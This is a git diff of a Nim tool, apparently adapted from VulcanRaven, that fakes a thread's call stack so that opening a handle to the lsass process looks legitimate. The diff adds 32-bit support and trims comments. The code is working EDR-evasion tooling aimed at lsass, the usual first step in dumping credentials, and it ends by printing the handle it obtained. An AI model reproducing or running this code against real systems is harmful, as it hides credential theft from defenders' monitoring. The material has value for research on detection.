@@ -206,109 +206,55 @@ proc DummyFunction(lpParam:LPVOID):DWORD {.stdcall.}=
     return 0
 
 proc PushtoStack(value:ULONG64):void =
-    context.Rsp = cast[ULONG64](cast[uint64](context.Rsp)-0x8)
-    var AddressToWrite:PULONG64 = cast[PULONG64](context.Rsp)
-    AddressToWrite[] = value
-    echo value
+    when winimCpu64:
+        context.Rsp = cast[ULONG64](cast[uint64](context.Rsp)-0x8)
+        var AddressToWrite:PULONG64 = cast[PULONG64](context.Rsp)
+        AddressToWrite[] = value
+    when winimCpu32:
+        context.Esp = cast[ULONG32](cast[uint32](context.Esp)-0x4)
+        var AddressToWrite:PULONG32 = cast[PULONG32](context.Esp)
+        AddressToWrite[] = value
 
 proc InitializeFakeThreadStack():void = 
-    var childSp:ULONG64 = 0
-    var bPreviousFrameSetUWOP_SET_FPREG:bool = false
-    # Set last return address to 0 --> Stack is already initialized because of the suspended threat
-    PushToStack(0)
-    #[
-     Directly copy and paste from VulcanRaven :D 
-     Loop through target call stack *backwards*
-     and modify the stack so it resembles the fake
-     call stack e.g. essentially making the top of
-     the fake stack look like the diagram below:
-          |                |
-           ----------------
-          |  RET ADDRESS   |
-           ----------------
-          |                |
-          |     Unwind     |
-          |     Stack      |
-          |      Size      |
-          |                |
-           ----------------
-          |  RET ADDRESS   |
-           ----------------
-          |                |
-          |     Unwind     |
-          |     Stack      |
-          |      Size      |
-          |                |
-           ----------------
-          |   RET ADDRESS  |
-           ----------------   <--- RSP when NtOpenProcess is called
-    ]#
-    for i in countdown(selectedStackFrame.len - 1 ,0):
-        #[
-            Check if the last frame set UWOP_SET_FPREG.
-            If the previous frame uses the UWOP_SET_FPREG
-            op, it will reset the stack pointer to rbp.
-            Therefore, we need to find the next function in
-            the chain which pushes rbp and make sure it writes
-            the correct value to the stack so it is propagated
-            to the frame after that needs it (otherwise stackwalk
-            will fail). The required value is the childSP
-            of the function that used UWOP_SET_FPREG (i.e. the
-            value of RSP after it is done adjusting the stack and
-            before it pushes its RET address).
-        ]#
-        if(bPreviousFrameSetUWOP_SET_FPREG and selectedStackFrame[i].pushRbp):
-            #[
-                Check when RBP was pushed to the stack in function
-                prologue. UWOP_PUSH_NONVOls will always be last:
-                "Because of the constraints on epilogs, UWOP_PUSH_NONVOL
-                unwind codes must appear first in the prolog and
-                correspondingly, last in the unwind code array."
-                Hence, subtract the push rbp code index from the
-                total count to work out when it is pushed onto stack.
-                E.g. diff will be 1 below, so rsp -= 0x8 then write childSP:
-                RPCRT4!LrpcIoComplete:
-                00007ffd`b342b480 4053            push    rbx
-                00007ffd`b342b482 55              push    rbp
-                00007ffd`b342b483 56              push    rsi
-                If diff == 0, rbp is pushed first etc.    
-            ]#
-            var diff = selectedStackFrame[i].countOfCodes - selectedStackFrame[i].pushRbpIndex
-            var tmpStackSizeCounter:int = 0
-            for j in countup(0,diff-1):
-                # Push rbx
-                PushToStack(0x0)
-                tmpStackSizeCounter+=0x8
-            # Push rbp
-            PushToStack(childSp)
-            # Minus off the remaining function stack size and continue unwinding.
-            context.Rsp -= cast[DWORD64](selectedStackFrame[i].totalStackSize - cast[uint64]((tmpStackSizeCounter + 0x8)))
-            var fakeRetAddress:PULONG64 = cast[PULONG64](context.Rsp)
-            fakeRetAddress[] = cast[ULONG64](selectedStackFrame[i].returnAddress)
-            #[
-             From my testing it seems you only need to get rbp
-             right for the next available frame in the chain which pushes it.
-             Hence, there can be a frame in between which does not push rbp.
-             Ergo set this to false once you have resolved rbp for frame
-             which needed it. This is pretty flimsy though so this assumption
-             may break for other more complicated examples.
-            ]#
-            bPreviousFrameSetUWOP_SET_FPREG = false
-        else:
-            # If normal frame, decrement total stack size and write RET address
-            echo selectedStackFrame[i].totalStackSize
-            context.Rsp -= cast[DWORD64](selectedStackFrame[i].totalStackSize)
-            var fakeRetAddress:PULONG64 = cast[PULONG64](context.Rsp)
-            fakeRetAddress[] = cast[ULONG64](selectedStackFrame[i].returnAddress)
-        #[
-         Check if the current function sets frame pointer
-         when unwinding e.g. mov rsp,rbp / UWOP_SET_FPREG
-         and record its childSP.
-        ]#
-        if(selectedStackFrame[i].setsFramePointer):
-            childSp = context.Rsp
-            childSp += 0x8
-            bPreviousFrameSetUWOP_SET_FPREG = true
+    when winimCpu64:
+        var childSp:ULONG64 = 0
+        var bPreviousFrameSetUWOP_SET_FPREG:bool = false
+        # Set last return address to 0 --> Stack is already initialized because of the suspended threat
+        PushToStack(0)
+        for i in countdown(selectedStackFrame.len - 1 ,0):
+            if(bPreviousFrameSetUWOP_SET_FPREG and selectedStackFrame[i].pushRbp):
+                var diff = selectedStackFrame[i].countOfCodes - selectedStackFrame[i].pushRbpIndex
+                var tmpStackSizeCounter:int = 0
+                for j in countup(0,diff-1):
+                    # Push rbx
+                    PushToStack(0x0)
+                    tmpStackSizeCounter+=0x8
+                # Push rbp
+                PushToStack(childSp)
+                # Minus off the remaining function stack size and continue unwinding.
+                context.Rsp -= cast[DWORD64](selectedStackFrame[i].totalStackSize - cast[uint64]((tmpStackSizeCounter + 0x8)))
+                var fakeRetAddress:PULONG64 = cast[PULONG64](context.Rsp)
+                fakeRetAddress[] = cast[ULONG64](selectedStackFrame[i].returnAddress)
+                bPreviousFrameSetUWOP_SET_FPREG = false
+            else:
+                # If normal frame, decrement total stack size and write RET address
+                context.Rsp -= cast[DWORD64](selectedStackFrame[i].totalStackSize)
+                var fakeRetAddress:PULONG64 = cast[PULONG64](context.Rsp)
+                fakeRetAddress[] = cast[ULONG64](selectedStackFrame[i].returnAddress)
+            if(selectedStackFrame[i].setsFramePointer):
+                childSp = context.Rsp
+                childSp += 0x8
+                bPreviousFrameSetUWOP_SET_FPREG = true
+    when winimCpu32:
+        PushtoStack(0)
+        for i in countdown(selectedStackFrame.len - 1 ,0):
+            # Push old ebp
+            PushtoStack(context.Ebp)
+            # Mov ebp,esp
+            context.Ebp = context.Esp
+            # push the return address
+            PushtoStack(selectedStackFrame[i].returnAddress)
+            # we have to consider the last case 
 
 
 proc GetLsassPid():DWORD = 
@@ -387,17 +333,17 @@ when isMainModule:
     if(SetThreadContext(hThread,addr context) == FALSE):
         echo "[!] Failed to set thread context!"
         quit(-1)
-    
     if(cast[uint64](AddVectoredExceptionHandler(1,cast[PVECTORED_EXCEPTION_HANDLER](VehCallback))) == 0):
         echo "[!] Failed to add vectored exception handler!"
         quit(-1)
     if(ResumeThread(hThread) == -1):
         echo "[!] Failed to resume suspended thread!"
         quit(-1)
-    echo "[+] Sleeping ..."
-    Sleep(5000)
+    discard WaitForSingleObject(hThread,INFINITE)
+    Sleep(3000)
     if(hLsass == 0):
-        echo "[!] Error on obtaining handle to lsass"
+        echo "[!] Error on obtaining handle to lsass!"
         quit(-1)
     else:
-        echo "[+] Spoof is successful"
+        echo "[+] Spoof is successful! Handle is ",hLsass
+        echo "[+] You can check the call stack from Sysmon!"
